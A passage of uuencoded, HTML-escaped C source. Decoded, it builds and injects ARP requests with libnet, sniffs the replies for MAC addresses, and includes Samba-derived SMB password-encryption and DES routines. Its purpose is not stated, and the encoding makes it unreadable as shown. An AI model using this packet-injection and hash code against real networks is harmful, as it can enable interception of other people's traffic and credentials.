M#0IV;VED($%R&lt;%)E&lt;75E&lt;W1);FIE8W1I;VXH=5]I;G0S,E]T(&quot;I)&lt;%-R8RP@
M(&quot;`@+RIS&lt;F,G&lt;R!)4&quot;!A9&#039;)E&lt;W,J+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&#039;5?:6YT,S)?=&quot;`J27!$&lt;W0L(&quot;\J9&amp;5S=&quot;=S($E0(&amp;%D&lt;F5S&lt;RHO#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@=5]C:&amp;%R(&quot;I%;F5T4W)C+&quot;`@(&quot;\J
M&lt;W)C)W,@34%#($%D&lt;F5S&lt;RHO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M=5]C:&amp;%R(&quot;I%;F5T1&#039;-T+&quot;\J9&amp;5S=&quot;=S($U!0R!!9&#039;)E&lt;W,J+PT*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;-H87(@*D1E=FEC92P@+RI$979I8V4@;F%M
M92!F;W(@:6YJ96-T:6]N*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!P
M8V%P7W0@*D1E&lt;V-R*0T*&gt;PT*(&amp;QI8FYE=%]T(&quot;IL.PT*(&amp;QI8FYE=%]P=&amp;%G
M7W0@5&amp;%G.PT*(&amp;-H87(@17)R0G5F6TQ)0DY%5%]%4E)&quot;549?4TE:15T[#0H-
M&quot;B!S=&#039;)U8W0@&lt;&amp;-A&lt;%]P:W1H9&#039;(@2&amp;5A9&amp;5R.PT*#0H@=5]I;G0S,E]T($%R
M&lt;%-R8SL-&quot;B!U7VEN=#,R7W0@07)P1&#039;-T.PT*#0H@&lt;W1R=6-T(&amp;5T:&amp;AD&lt;B`J
M171H97)(9&#039;([#0H-&quot;B!S=&#039;)U8W0@971H97)?87)P(&quot;I!&lt;G!(9&#039;([#0H-&quot;B!C
M:&amp;%R(&quot;I086-K970[#0H@#0H@=5]C:&amp;%R(%IE&lt;F];151(7T%,14Y=(#T@&gt;S!X
M,&quot;PP&gt;#`L,&#039;@P+#!X,&quot;PP&gt;#`L,&#039;@P?3L@#0H@#0H@=5]C:&amp;%R($)R;V%D8V%S
M=%M%5$A?04Q%3ET@/2![,&#039;AF9BPP&gt;&amp;9F+#!X9F8L,&#039;AF9BPP&gt;&amp;9F+#!X9F9]
M.PT*#0HO*DQI8FYE=&quot;!I;FET:6%L:7IA=&amp;EO;BHO#0H-&quot;B!L(#T@;&amp;EB;F5T
M7VEN:70H3$E&quot;3D547TQ)3DLL1&amp;5V:6-E+$5R&lt;D)U9BD[#0H-&quot;B\J5V4@8G5I
M;&amp;0@=&amp;AE($%24&quot;!H96%D97(J+PT*#0H@5&amp;%G(#T@;&amp;EB;F5T7V)U:6QD7V%R
M&lt;&quot;@-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@($%24$A21%]%5$A%4BPO*DAA
M&lt;F1W87)E(&amp;%D9&#039;(J+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@151(15)4
M65!%7TE0+&quot;\J4&#039;)O=&amp;]C;VP@861D&lt;BHO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`V+&quot;\J4VEZ92!O9B!-04,@861R97-S*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(#0L+RI3:7IE(&amp;]F($E0(&amp;%D&lt;F5S&lt;RHO#0H@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!!4E!/4%]215%515-4+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@16YE=%-R8RPO*F-L:65N=&quot;=S($U!0R!A9&#039;)E&lt;W,J+PT*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@*&#039;5?8VAA&lt;B`J*2!)&lt;%-R8RPO*F-L:65N
M=&quot;=S($E0(&amp;%D9&#039;)E&lt;W,J+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@6F5R
M;RP@+RI.;W1H:6YG(&quot;$@/3X@05)0(%)%455%4U0J+R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@($EP1&#039;-T+&quot;`@+RIC;&amp;EE;G0G&lt;R!)
M4&quot;!A9&amp;1R97-S*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@($Y53$PL#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`P+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@;&quot;P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(#`I.PT*#0HO*D9O
M;&amp;QO=VEN9R!B&gt;2!T:&amp;4@8G5I;&amp;1I;F&lt;@;V8@=&amp;AE(&amp;5T:&amp;5R;F5T(&amp;AE861E
M&lt;BHO#0H-&quot;B!486&lt;@/2!L:6)N971?875T;V)U:6QD7V5T:&amp;5R;F5T*`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@0G)O861C87-T+&quot;`@+RI%
M=&amp;AE&lt;FYE=&quot;!D97-T:6YA=&amp;EO;BHO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;!%5$A%4E194$5?05)0+&quot;`@+RI0&lt;F]T;V-O;&quot;!4&gt;7!E*B\-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;PI.PT*#0H-&quot;B\J
M5W)I=&amp;4@=&amp;AE(%!A8VME=&quot;!W:7)E*B\-&quot;@T*(&amp;QI8FYE=%]W&lt;FET92AL*3L-
M&quot;@T*+RI,:6)N970@9&amp;5S=&#039;)O&gt;2!L*B\-&quot;@T*(&amp;QI8FYE=%]D97-T&lt;F]Y*&amp;PI
M.PT*#0H@+RI4;R!S;FEF9B!T:&amp;4@05)0(&#039;)E&lt;&amp;QY(&amp;%N9&quot;!C;VQL96-T($U!
M0R!A9&amp;1R97-S97,J+PT*(`T*(&#039;=H:6QE*#$I#0H@&gt;PT*(&quot;!086-K970@/2`H
M=5]C:&amp;%R(&quot;HI(&#039;!C87!?;F5X=&quot;A$97-C&lt;BPF2&amp;5A9&amp;5R*3L-&quot;@T*(&quot;!%=&amp;AE
M&lt;DAD&lt;B`](&quot;AS=&#039;)U8W0@971H:&amp;1R(&quot;HI(&quot;A086-K970I.PT*#0H@(&amp;EF*&amp;YT
M;VAS*$5T:&amp;5R2&amp;1R+3YH7W!R;W1O*3T]151(15)465!%7T%24&quot;D-&quot;B`@&gt;PT*
M(&quot;`@07)P2&amp;1R(#T@*&#039;-T&lt;G5C=&quot;!E=&amp;AE&lt;E]A&lt;G`@*BD@*%!A8VME=&quot;`K($54
M2%](3$5.*3L-&quot;B`@(&quot;`-&quot;B`@(&amp;EF*&amp;YT;VAS*$%R&lt;$AD&lt;BT^96%?:&amp;1R+F%R
M7V]P*3T]05)03U!?4D503%DI#0H@(&quot;![#0H)(&quot;`@#0H@(&quot;`@;65M8W!Y*&quot;9!
M&lt;G!3&lt;F,L(&quot;AU7VEN=#,R7W0@*BD@*$%R&lt;$AD&lt;BT^87)P7W-P82DL(&#039;-I&gt;F5O
M9BAU7VEN=#,R7W0I*3L-&quot;B`@(&quot;!M96UC&lt;&#039;DH)D%R&lt;$1S=&quot;P@*&#039;5?:6YT,S)?
M=&quot;`J*2`H07)P2&amp;1R+3YA&lt;G!?=&#039;!A*2P@&lt;VEZ96]F*&#039;5?:6YT,S)?=&quot;DI.PT*
M(&quot;`@(`T*(&quot;`@(&amp;EF*&quot;`H($%R&lt;%-R8R`@/3T@*DEP1&#039;-T*2`F)@T*(&quot;`@(&quot;`@
M(&quot;`H($%R&lt;$1S=&quot;`@/3T@*DEP4W)C*2D-&quot;B`@(&quot;`@&gt;PT*#0H@(&quot;`@(&amp;UE;6-P
M&gt;2@H=5]C:&amp;%R(&quot;HI(&quot;A%;F5T1&#039;-T*2P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;AU7V-H87(@
M*BD@*$%R&lt;$AD&lt;BT^87)P7W-H82DL#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;!%5$A?04Q%3BD[
M#0H@(&quot;`@(`T*(&quot;`@(&quot;!B&lt;F5A:SL-&quot;B`@(&quot;!]#0H@(&quot;!]#0H@(&#039;T-&quot;B!]#0I]
M#0H-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*+RI4:&amp;4@96YC&lt;GEP
M=&amp;EO;B!F=6YC=&amp;EO;G,@*&quot;!S:&amp;%M969U;&amp;QY(&#039;1A:V5N(&amp;9R;VT@4V%M8F$I
M*B\-&quot;@T*#0HO*B`-&quot;B`@(%5N:7@@4TU&quot;+TYE=&amp;)I;W,@:6UP;&amp;5M96YT871I
M;VXN#0H@(&quot;!697)S:6]N(#$N.2X-&quot;B`@(%--0B!P87)A;65T97)S(&amp;%N9&quot;!S
M971U&lt;`T*(&quot;`@0V]P&gt;7)I9VAT(&quot;A#*2!!;F1R97&lt;@5&#039;)I9&amp;=E;&amp;P@,3DY,BTQ
M.3DX#0H@(&quot;!-;V1I9FEE9&quot;!B&gt;2!*97)E;7D@06QL:7-O;B`Q.3DU+@T*(&quot;`@
M#0H@(&quot;!4:&amp;ES(&#039;!R;V=R86T@:7,@9G)E92!S;V9T=V%R93L@&gt;6]U(&amp;-A;B!R
M961I&lt;W1R:6)U=&amp;4@:70@86YD+V]R(&amp;UO9&amp;EF&gt;0T*(&quot;`@:70@=6YD97(@=&amp;AE
M(&#039;1E&lt;FUS(&amp;]F(&#039;1H92!&#039;3E4@1V5N97)A;&quot;!0=6)L:6,@3&amp;EC96YS92!A&lt;R!P
M=6)L:7-H960@8GD-&quot;B`@(&#039;1H92!&amp;&lt;F5E(%-O9G1W87)E($9O=6YD871I;VX[
M(&amp;5I=&amp;AE&lt;B!V97)S:6]N(#(@;V8@=&amp;AE($QI8V5N&lt;V4L(&amp;]R#0H@(&quot;`H870@
M&gt;6]U&lt;B!O&lt;&#039;1I;VXI(&amp;%N&gt;2!L871E&lt;B!V97)S:6]N+@T*(&quot;`@#0H@(&quot;!4:&amp;ES
M(&#039;!R;V=R86T@:7,@9&amp;ES=&#039;)I8G5T960@:6X@=&amp;AE(&amp;AO&lt;&amp;4@=&amp;AA=&quot;!I=&quot;!W
M:6QL(&amp;)E(&#039;5S969U;&quot;P-&quot;B`@(&amp;)U=&quot;!7251(3U54($%.62!705)204Y463L@
M=VET:&amp;]U=&quot;!E=F5N(&#039;1H92!I;7!L:65D(&#039;=A&lt;G)A;G1Y(&amp;]F#0H@(&quot;!-15)#
M2$%.5$%&quot;24Q)5%D@;W(@1DE43D534R!&amp;3U(@02!005)424-53$%2(%!54E!/
M4T4N(&quot;!3964@=&amp;AE#0H@(&quot;!&#039;3E4@1V5N97)A;&quot;!0=6)L:6,@3&amp;EC96YS92!F
M;W(@;6]R92!D971A:6QS+@T*(&quot;`@#0H@(&quot;!9;W4@&lt;VAO=6QD(&amp;AA=F4@&lt;F5C
M96EV960@82!C;W!Y(&amp;]F(&#039;1H92!&#039;3E4@1V5N97)A;&quot;!0=6)L:6,@3&amp;EC96YS
M90T*(&quot;`@86QO;F&lt;@=VET:&quot;!T:&amp;ES(&#039;!R;V=R86T[(&amp;EF(&amp;YO=&quot;P@=W)I=&amp;4@
M=&amp;\@=&amp;AE($9R964@4V]F=&#039;=A&lt;F4-&quot;B`@($9O=6YD871I;VXL($EN8RXL(#8W
M-2!-87-S($%V92P@0V%M8G)I9&amp;=E+&quot;!-02`P,C$S.2P@55-!+@T**B\-&quot;@T*
M#0HO*@T*(&quot;`@5&amp;AI&lt;R!I;7!L96UE;G1S(&#039;1H92!8+T]P96X@4TU&quot;(&#039;!A&lt;W-W
M;W)D(&amp;5N8W)Y&lt;&#039;1I;VX-&quot;B`@($ET(&#039;1A:V5S(&amp;$@&lt;&amp;%S&lt;W=O&lt;F0L(&amp;$@.&quot;!B
M&gt;71E(&quot;)C&lt;GEP=&quot;!K97DB(&amp;%N9&quot;!P=71S(#(T(&amp;)Y=&amp;5S(&amp;]F(`T*(&quot;`@96YC
M&lt;GEP=&amp;5D(&#039;!A&lt;W-W;W)D(&amp;EN=&amp;\@&lt;#(T(&quot;HO#0H-&quot;@T*=F]I9&quot;!334)E;F-R
M&gt;7!T*&#039;5C:&amp;%R(&quot;IP87-S=V0L(&#039;5C:&amp;%R(&quot;IC.&quot;P@=6-H87(@*G`R-&quot;D-&quot;GL-
M&quot;B!U8VAA&lt;B!P,31;,35=+&quot;!P,C%;,C%=.PT*(&amp;EN=&quot;!I.PT*(&quot;\J06QL(&amp;QE
M=&#039;1E&lt;G,@:6X@=7!P97(@8V%S92!L971T97(J+PT*(`T*(&amp;9O&lt;BAI/3`[:3PQ
M-3MI*RLI#0H@&gt;PT*(&quot;!I9B@@&lt;&amp;%S&lt;W=D6VE=(#X](#DW(&quot;8F(&#039;!A&lt;W-W9%MI
M72`\/2`Q,C(I#0H@(&#039;L-&quot;B`@(&#039;!A&lt;W-W9%MI73UP87-S=V1;:5TM,S([#0H@
M(&#039;T-&quot;B!]#0H@#0H@;65M&lt;V5T*&#039;`R,2PG7#`G+#(Q*3L-&quot;B!M96US970H&lt;#$T
M+&quot;=&lt;,&quot;&lt;L,30I.PT*(&#039;-T&lt;FYC&lt;&#039;DH*&amp;-H87(@*BEP,30L*&amp;-O;G-T(&amp;-H87(@
M*BEP87-S=V0L,30I.PT*#0H@15]0,38H&lt;#$T+&quot;!P,C$I.R`-&quot;@T*(%--0D]7
M1F5N8W)Y&lt;&#039;0H&lt;#(Q+&quot;!C.&quot;P@&lt;#(T*3L-&quot;@T*?0T*#0IV;VED(%--0D]71F5N
M8W)Y&lt;&#039;0H=6-H87(@&lt;&amp;%S&lt;W=D6S$V72P@=6-H87(@*F,X+&quot;!U8VAA&lt;B!P,C1;
M,C1=*0T*&gt;PT*(&#039;5C:&amp;%R(&#039;`R,5LR,5T[#0H@#0H@#0H@#0H);65M&lt;V5T*&#039;`R
M,2PG7#`G+#(Q*3L-&quot;B`-&quot;@EM96UC&lt;&#039;DH&lt;#(Q+&quot;!P87-S=V0L(#$V*3L@(&quot;`@
M#0H)15]0,C0H&lt;#(Q+&quot;!C.&quot;P@&lt;#(T*3L-&quot;GT-&quot;@T*+RH@#0H@(&quot;!5;FEX(%--
M0B]#2493(&amp;EM&lt;&amp;QE;65N=&amp;%T:6]N+@T*#0H@(&quot;!A(&#039;!A&lt;G1I86P@:6UP;&amp;5M
M96YT871I;VX@;V8@1$53(&amp;1E&lt;VEG;F5D(&amp;9O&lt;B!U&lt;V4@:6X@=&amp;AE(`T*(&quot;`@
M4TU&quot;(&amp;%U=&amp;AE;G1I8V%T:6]N(&#039;!R;W1O8V]L#0H-&quot;B`@($-O&lt;&#039;ER:6=H=&quot;`H
M0RD@06YD&lt;F5W(%1R:61G96QL(#$Y.3@-&quot;B`@(`T*(&quot;`@5&amp;AI&lt;R!P&lt;F]G&lt;F%M
M(&amp;ES(&amp;9R964@&lt;V]F=&#039;=A&lt;F4[(&#039;EO=2!C86X@&lt;F5D:7-T&lt;FEB=71E(&amp;ET(&amp;%N
M9&quot;]O&lt;B!M;V1I9GD-&quot;B`@(&amp;ET(&#039;5N9&amp;5R(&#039;1H92!T97)M&lt;R!O9B!T:&amp;4@1TY5
M($=E;F5R86P@4&#039;5B;&amp;EC($QI8V5N&lt;V4@87,@&lt;&#039;5B;&amp;ES:&amp;5D(&amp;)Y#0H@(&quot;!T
M:&amp;4@1G)E92!3;V9T=V%R92!&amp;;W5N9&amp;%T:6]N.R!E:71H97(@=F5R&lt;VEO;B`R
M(&amp;]F(&#039;1H92!,:6-E;G-E+&quot;!O&lt;@T*(&quot;`@*&amp;%T(&#039;EO=7(@;W!T:6]N*2!A;GD@
M;&amp;%T97(@=F5R&lt;VEO;BX-&quot;B`@(`T*(&quot;`@5&amp;AI&lt;R!P&lt;F]G&lt;F%M(&amp;ES(&amp;1I&lt;W1R
M:6)U=&amp;5D(&amp;EN(&#039;1H92!H;W!E(&#039;1H870@:70@=VEL;&quot;!B92!U&lt;V5F=6PL#0H@
M(&quot;!B=70@5TE42$]55&quot;!!3ED@5T%24D%.5%D[(&#039;=I=&amp;AO=70@979E;B!T:&amp;4@
M:6UP;&amp;EE9&quot;!W87)R86YT&gt;2!O9@T*(&quot;`@34520TA!3E1!0DE,2519(&amp;]R($9)
M5$Y%4U,@1D]2($$@4$%25$E#54Q!4B!055)03U-%+B`@4V5E(&#039;1H90T*(&quot;`@
M1TY5($=E;F5R86P@4&#039;5B;&amp;EC($QI8V5N&lt;V4@9F]R(&amp;UO&lt;F4@9&amp;5T86EL&lt;RX-
M&quot;B`@(`T*(&quot;`@66]U(&#039;-H;W5L9&quot;!H879E(&#039;)E8V5I=F5D(&amp;$@8V]P&gt;2!O9B!T
M:&amp;4@1TY5($=E;F5R86P@4&#039;5B;&amp;EC($QI8V5N&lt;V4-&quot;B`@(&amp;%L;VYG(&#039;=I=&amp;@@
M=&amp;AI&lt;R!P&lt;F]G&lt;F%M.R!I9B!N;W0L(&#039;=R:71E(&#039;1O(&#039;1H92!&amp;&lt;F5E(%-O9G1W
M87)E#0H@(&quot;!&amp;;W5N9&amp;%T:6]N+&quot;!);F,N+&quot;`V-S4@36%S&lt;R!!=F4L($-A;6)R
M:61G92P@34$@,#(Q,SDL(%5302X-&quot;BHO#0H-&quot;@T*+RH@3D]415,Z(`T*#0H@
M(&quot;!4:&amp;ES(&amp;-O9&amp;4@;6%K97,@;F\@871T96UP=&quot;!T;R!B92!F87-T(2!);B!F
M86-T+&quot;!I=&quot;!I&lt;R!A(&#039;9E&lt;GD-&quot;B`@(&#039;-L;W&lt;@:6UP;&amp;5M96YT871I;VX@#0H-
M&quot;B`@(%1H:7,@8V]D92!I&lt;R!.3U0@82!C;VUP;&amp;5T92!$15,@:6UP;&amp;5M96YT
M871I;VXN($ET(&amp;EM&lt;&amp;QE;65N=&#039;,@;VYL&gt;0T*(&quot;`@=&amp;AE(&amp;UI;FEM=6T@;F5C
M97-S87)Y(&amp;9O&lt;B!334(@875T:&amp;5N=&amp;EC871I;VXL(&amp;%S(&#039;5S960@8GD@86QL
M(%--0@T*(&quot;`@&lt;&#039;)O9&#039;5C=&#039;,@*&amp;EN8VQU9&amp;EN9R!E=F5R&gt;2!C;W!Y(&amp;]F($UI
M8W)O&lt;V]F=&quot;!7:6YD;W=S.34@979E&lt;B!S;VQD*0T*#0H@(&quot;!);B!P87)T:6-U
M;&amp;%R+&quot;!I=&quot;!C86X@;VYL&gt;2!D;R!A(&#039;5N8VAA:6YE9&quot;!F;W)W87)D($1%4R!P
M87-S+B!4:&amp;ES#0H@(&quot;!M96%N&lt;R!I=&quot;!I&lt;R!N;W0@&lt;&amp;]S&lt;VEB;&amp;4@=&amp;\@=7-E
M(&#039;1H:7,@8V]D92!F;W(@96YC&lt;GEP=&amp;EO;B]D96-R&gt;7!T:6]N#0H@(&quot;!O9B!D
M871A+&quot;!I;G-T96%D(&amp;ET(&amp;ES(&amp;]N;&#039;D@=7-E9G5L(&amp;%S(&amp;$@(FAA&lt;V@B(&amp;%L
M9V]R:71H;2X-&quot;@T*(&quot;`@5&amp;AE&lt;F4@:7,@;F\@96YT&lt;GD@&lt;&amp;]I;G0@:6YT;R!T
M:&amp;ES(&amp;-O9&amp;4@=&amp;AA=&quot;!A;&amp;QO=W,@;F]R;6%L($1%4R`-&quot;B`@(&quot;IO&lt;&amp;5R871I
M;VXN#0H-&quot;B`@($D@8F5L:65V92!T:&amp;ES(&amp;UE86YS(&#039;1H870@=&amp;AI&lt;R!C;V1E
M(&amp;1O97,@;F]T(&amp;-O;64@=6YD97(@251!4@T*(&quot;`@&lt;F5G=6QA=&amp;EO;G,@8G5T
M(&#039;1H:7,@:7,@3D]4(&amp;$@;&amp;5G86P@;W!I;FEO;BX@268@&gt;6]U(&amp;%R92!C;VYC
M97)N960-&quot;B`@(&amp;%B;W5T(&#039;1H92!A&lt;&#039;!L:6-A8FEL:71Y(&amp;]F($E405(@&lt;F5G
M=6QA=&amp;EO;G,@=&amp;\@=&amp;AI&lt;R!C;V1E(&#039;1H96X@&gt;6]U#0H@(&quot;!S:&amp;]U;&amp;0@8V]N
M9FER;2!I=&quot;!F;W(@&gt;6]U&lt;G-E;&amp;8@*&amp;%N9&quot;!M87EB92!L970@;64@:VYO=R!I
M9B!Y;W4@8V]M90T*(&quot;`@=7`@=VET:&quot;!A(&amp;1I9F9E&lt;F5N=&quot;!A;G-W97(@=&amp;\@
M=&amp;AE(&amp;]N92!A8F]V92D-&quot;BHO#0H-&quot;@T*(V1E9FEN92!U8VAA&lt;B!U;G-I9VYE
M9&quot;!C:&amp;%R#0H-&quot;G-T871I8R!U8VAA&lt;B!P97)M,5LU-ET@/2![-3&lt;L(#0Y+&quot;`T
M,2P@,S,L(#(U+&quot;`Q-RP@(#DL#0H)&quot;0D@,2P@-3@L(#4P+&quot;`T,BP@,S0L(#(V
M+&quot;`Q.&quot;P-&quot;@D)&quot;3$P+&quot;`@,BP@-3DL(#4Q+&quot;`T,RP@,S4L(#(W+`T*&quot;0D),3DL
M(#$Q+&quot;`@,RP@-C`L(#4R+&quot;`T-&quot;P@,S8L#0H)&quot;0DV,RP@-34L(#0W+&quot;`S.2P@
M,S$L(#(S+&quot;`Q-2P-&quot;@D)&quot;2`W+&quot;`V,BP@-30L(#0V+&quot;`S.&quot;P@,S`L(#(R+`T*
M&quot;0D),30L(&quot;`V+&quot;`V,2P@-3,L(#0U+&quot;`S-RP@,CDL#0H)&quot;0DR,2P@,3,L(&quot;`U
M+&quot;`R.&quot;P@,C`L(#$R+&quot;`@-&#039;T[#0H-&quot;G-T871I8R!U8VAA&lt;B!P97)M,ELT.%T@
M/2![,30L(#$W+&quot;`Q,2P@,C0L(&quot;`Q+&quot;`@-2P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`S+&quot;`R.&quot;P@,34L(&quot;`V+&quot;`R,2P@,3`L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`R,RP@,3DL(#$R+&quot;`@-&quot;P@,C8L(&quot;`X+`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,38L(&quot;`W+&quot;`R-RP@,C`L(#$S+&quot;`@,BP-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(#0Q+&quot;`U,BP@,S$L(#,W+&quot;`T-RP@-34L#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`S,&quot;P@-#`L(#4Q+&quot;`T-2P@,S,L(#0X
M+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@-#0L(#0Y+&quot;`S.2P@-38L(#,T
M+&quot;`U,RP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(#0V+&quot;`T,BP@-3`L(#,V
M+&quot;`R.2P@,S)].PT*#0IS=&amp;%T:6,@=6-H87(@&lt;&amp;5R;3-;-C1=(#T@&gt;S4X+&quot;`U
M,&quot;P@-#(L(#,T+&quot;`R-BP@,3@L(#$P+&quot;`@,BP-&quot;@D)&quot;38P+&quot;`U,BP@-#0L(#,V
M+&quot;`R.&quot;P@,C`L(#$R+&quot;`@-&quot;P-&quot;@D)&quot;38R+&quot;`U-&quot;P@-#8L(#,X+&quot;`S,&quot;P@,C(L
M(#$T+&quot;`@-BP-&quot;@D)&quot;38T+&quot;`U-BP@-#@L(#0P+&quot;`S,BP@,C0L(#$V+&quot;`@.&quot;P-
M&quot;@D)&quot;34W+&quot;`T.2P@-#$L(#,S+&quot;`R-2P@,3&lt;L(&quot;`Y+&quot;`@,2P-&quot;@D)&quot;34Y+&quot;`U
M,2P@-#,L(#,U+&quot;`R-RP@,3DL(#$Q+&quot;`@,RP-&quot;@D)&quot;38Q+&quot;`U,RP@-#4L(#,W
M+&quot;`R.2P@,C$L(#$S+&quot;`@-2P-&quot;@D)&quot;38S+&quot;`U-2P@-#&lt;L(#,Y+&quot;`S,2P@,C,L
M(#$U+&quot;`@-WT[#0H-&quot;G-T871I8R!U8VAA&lt;B!P97)M-%LT.%T@/2![(&quot;`@,S(L
M(&quot;`Q+&quot;`@,BP@(#,L(&quot;`T+&quot;`@-2P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`T+&quot;`@-2P@(#8L(&quot;`W+&quot;`@.&quot;P@(#DL#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@.&quot;P@(#DL(#$P+&quot;`Q,2P@,3(L(#$S+`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,3(L(#$S+&quot;`Q-&quot;P@,34L(#$V+&quot;`Q-RP-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(#$V+&quot;`Q-RP@,3@L(#$Y+&quot;`R,&quot;P@
M,C$L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`R,&quot;P@,C$L(#(R+&quot;`R
M,RP@,C0L(#(U+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,C0L(#(U
M+&quot;`R-BP@,C&lt;L(#(X+&quot;`R.2P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(#(X+&quot;`R.2P@,S`L(#,Q+&quot;`S,BP@(#%].PT*#0IS=&amp;%T:6,@=6-H87(@&lt;&amp;5R
M;35;,S)=(#T@&gt;R`@(&quot;`@(#$V+&quot;`@-RP@,C`L(#(Q+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,CDL(#$R+&quot;`R.&quot;P@,3&lt;L#0H@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,2P@,34L(#(S+&quot;`R-BP-&quot;B`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`U+&quot;`Q.&quot;P@,S$L(#$P+`T*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(#(L(&quot;`X+&quot;`R-&quot;P@,30L#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`S,BP@,C&lt;L(&quot;`S+&quot;`@.2P-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(#$Y+&quot;`Q,RP@,S`L(&quot;`V+`T*
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,C(L(#$Q+&quot;`@-&quot;P@,C5]
M.PT*#0H-&quot;G-T871I8R!U8VAA&lt;B!P97)M-ELV-%T@/7L@-#`L(&quot;`X+&quot;`T.&quot;P@
M,38L(#4V+&quot;`R-&quot;P@-C0L(#,R+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M,SDL(&quot;`W+&quot;`T-RP@,34L(#4U+&quot;`R,RP@-C,L(#,Q+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@,S@L(&quot;`V+&quot;`T-BP@,30L(#4T+&quot;`R,BP@-C(L(#,P+`T*
